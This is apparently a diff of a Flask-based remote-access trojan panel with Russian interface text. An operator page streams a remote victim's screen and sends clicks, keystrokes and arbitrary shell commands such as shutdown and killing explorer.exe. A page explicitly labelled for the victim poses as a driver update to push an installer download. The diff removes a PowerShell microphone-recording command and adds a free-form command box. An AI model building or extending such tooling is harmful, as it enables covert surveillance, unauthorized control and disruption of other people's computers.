@@ -5,7 +5,6 @@ app = Flask(__name__)
 
 latest_screenshot = 'screen.jpg'
 commands = []
-file_to_download = None
 
 HTML_ADMIN = """
 <!DOCTYPE html>
@@ -18,22 +17,28 @@ HTML_ADMIN = """
             <img id="screen" src="/get_screen" style="width:100%; border:2px solid red; cursor:crosshair;" onclick="sendClick(event)">
         </div>
         <div style="width:25%; background:#222; padding:10px; border-radius:5px;">
-            <h3>Управление</h3>
-            <button onclick="sendCmd('shutdown /s /t 0')" style="width:100%; padding:10px; margin-bottom:5px; background:red; color:white; border:none;">Выключить ПК</button>
-            <button onclick="sendCmd('shutdown /r /t 0')" style="width:100%; padding:10px; margin-bottom:5px; background:orange; color:white; border:none;">Перезагрузить</button>
-            <button onclick="recordAudio()" style="width:100%; padding:10px; margin-bottom:5px; background:purple; color:white; border:none;">Записать звук</button>
-            <button onclick="sendCmd('taskkill /f /im explorer.exe')" style="width:100%; padding:10px; background:gray; color:white; border:none;">Скрыть всё</button>
+            <h3>Действия</h3>
+            <button onclick="sendCmd('shutdown /s /t 0')" style="width:100%; padding:10px; margin-bottom:5px; background:red; color:white; border:none; cursor:pointer;">Выключить</button>
+            <button onclick="sendCmd('shutdown /r /t 0')" style="width:100%; padding:10px; margin-bottom:5px; background:orange; color:white; border:none; cursor:pointer;">Перезагрузить</button>
+            <button onclick="sendCmd('calc')" style="width:100%; padding:10px; margin-bottom:5px; background:green; color:white; border:none; cursor:pointer;">Калькулятор</button>
+            <button onclick="sendCmd('taskkill /f /im explorer.exe')" style="width:100%; padding:10px; background:gray; color:white; border:none; cursor:pointer;">Скрыть всё</button>
         </div>
     </div>
     
-    <input type="text" id="cmd" placeholder="Команда..." style="padding:10px; width:300px;">
-    <button onclick="sendKey()" style="padding:10px;">Отправить</button>
+    <div style="margin-bottom:10px;">
+        <input type="text" id="cmd" placeholder="Введи команду..." style="padding:10px; width:300px;">
+        <button onclick="sendCmd(document.getElementById('cmd').value)" style="padding:10px; background:orange; color:black; border:none; cursor:pointer;">Выполнить</button>
+    </div>
+    <div>
+        <input type="text" id="text" placeholder="Введи текст для печати..." style="padding:10px; width:300px;">
+        <button onclick="sendText()" style="padding:10px; background:blue; color:white; border:none; cursor:pointer;">Напечатать</button>
+    </div>
     
     <script>
         function refreshImg() {
             document.getElementById('screen').src = "/get_screen?t=" + new Date().getTime();
         }
-        setInterval(refreshImg, 2000);
+        setInterval(refreshImg, 1500);
 
         function sendClick(e) {
             var img = document.getElementById('screen');
@@ -43,19 +48,16 @@ HTML_ADMIN = """
             fetch('/click', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({x: x, y: y}) });
         }
 
-        function sendKey() {
-            var text = document.getElementById('cmd').value;
-            fetch('/type', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({text: text}) });
-            document.getElementById('cmd').value = '';
-        }
-        
         function sendCmd(cmd) {
+            if(!cmd) return;
             fetch('/run_cmd', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cmd: cmd}) });
         }
         
-        function recordAudio() {
-            sendCmd('powershell -c "Add-Type -AssemblyName System.Speech; $rec = New-Object System.Speech.Recognition.SpeechRecognitionEngine; $rec.SetInputToDefaultAudioDevice(); $rec.RecognizeAsync(); Start-Sleep -s 5; $rec.RecognizeAsyncStop();"');
-            alert('Запись начата на 5 секунд. Через 10 секунд забери файл audio.wav!');
+        function sendText() {
+            var text = document.getElementById('text').value;
+            if(!text) return;
+            fetch('/type', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({text: text}) });
+            document.getElementById('text').value = '';
         }
     </script>
 </body>
@@ -65,7 +67,7 @@ HTML_ADMIN = """
 HTML_VICTIM = """
 <!DOCTYPE html>
 <html>
-<head><title>Обновление</title></head>
+<head><title>Обновление драйверов</title></head>
 <body style="background:#1e1e1e; color:white; text-align:center; padding-top:50px; font-family:Arial;">
     <h1>Скачайте установщик</h1>
     <a href="/download" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; text-decoration:none; border-radius:5px;">Скачать</a>
